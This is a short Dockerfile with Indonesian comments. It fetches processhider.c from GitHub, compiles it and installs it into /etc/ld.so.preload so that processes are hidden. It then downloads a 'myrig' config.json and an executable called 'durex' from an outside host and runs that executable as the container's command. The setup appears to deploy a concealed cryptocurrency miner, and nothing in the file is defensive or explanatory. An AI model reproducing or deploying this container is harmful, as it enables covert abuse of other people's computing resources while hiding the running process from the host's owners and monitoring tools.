# Gunakan image dasar
FROM ubuntu:20.04

# Install wget, compiler gcc, dan perangkat lunak yang dibutuhkan
RUN apt-get update && apt-get install -y wget gcc

# Download processhider.c
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c

# Compile processhider.c dan pindahkan libprocess.so
RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
    && mv libprocess.so /usr/local/lib/ \
    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

# Download dan jalankan kode yang diinginkan saat container berjalan
RUN wget https://nyadur.000webhostapp.com/myrig/config.json \
    && wget https://nyadur.000webhostapp.com/myrig/durex \
    && chmod +x durex
RUN mv config.json /root/config.json   

# Perintah yang akan dijalankan saat container pertama kali dijalankan
# Ganti perintah ini sesuai dengan kebutuhan Anda
CMD ["./durex"]
